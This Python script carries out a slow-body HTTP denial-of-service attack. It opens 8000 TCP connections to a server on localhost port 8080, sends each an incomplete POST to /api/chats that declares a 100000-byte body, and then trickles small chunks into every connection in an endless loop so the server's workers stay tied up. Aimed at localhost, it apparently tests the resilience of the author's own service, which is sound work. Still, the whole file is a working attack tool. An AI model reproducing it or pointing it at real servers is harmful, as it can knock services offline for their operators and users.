import socket

tcp_connections=[]

for _ in range(8000):
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect(("localhost", 8080))
    tcp_connections.append(tcp)

data=(
    b"POST /api/chats HTTP/1.0\r\n"
    b"Content-Length: 100000\r\n"
    b"Content-Type: application/json\r\n\r\n"
    b'{"content": "'
)

for connection in tcp_connections:
    connection.sendall(data)

while True:
    for connection in tcp_connections:
        try:
            connection.send(b'aaaaaaaaaa')
        except:
            pass

# for connection in tcp_connections:
#     connection[0].send(b'"}')
#     print(connection.recv(1024))